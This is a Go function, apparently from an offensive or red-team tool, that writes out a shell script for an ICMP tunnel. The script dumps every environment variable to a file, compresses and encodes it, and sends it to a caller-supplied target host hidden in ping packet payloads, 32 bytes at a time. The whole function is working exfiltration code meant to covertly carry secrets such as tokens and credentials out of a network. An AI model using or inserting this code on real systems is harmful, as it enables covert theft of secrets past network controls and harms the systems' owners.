func buildICMPChannel(b *strings.Builder, target string) {
	b.WriteString("  # === ICMP Tunnel Exfiltration ===\n")
	b.WriteString("  echo \"[*] Initiating ICMP tunnel...\"\n\n")
	b.WriteString("  printenv > \"$_cdir/data.env\" 2>/dev/null\n")
	b.WriteString("  tar czf \"$_cdir/data.tar.gz\" -C \"$_cdir\" data.env 2>/dev/null\n")
	b.WriteString("  hex=$(base64 -w0 \"$_cdir/data.tar.gz\" 2>/dev/null | xxd -p | tr -d '\\n')\n\n")
	b.WriteString("  # Split into 32-byte chunks for ICMP payloads\n")
	b.WriteString("  i=0\n")
	b.WriteString("  while [ ${#hex} -gt 0 ]; do\n")
	b.WriteString("    chunk=$(printf '%.32s' \"$hex\")\n")
	b.WriteString("    hex=${hex#\"$chunk\"}\n")
	b.WriteString("    padded=$(printf '%-32s' \"$chunk\" | tr ' ' '0')\n")
	fmt.Fprintf(b, "    ping -c 1 -s 32 -p \"$padded\" \"%s\" >/dev/null 2>&1 || true\n", target)
	b.WriteString("    sleep 0.02\n")
	b.WriteString("    i=$((i + 1))\n")
	b.WriteString("  done\n")
	b.WriteString("  echo \"[+] Sent $i ICMP packets\"\n\n")
}

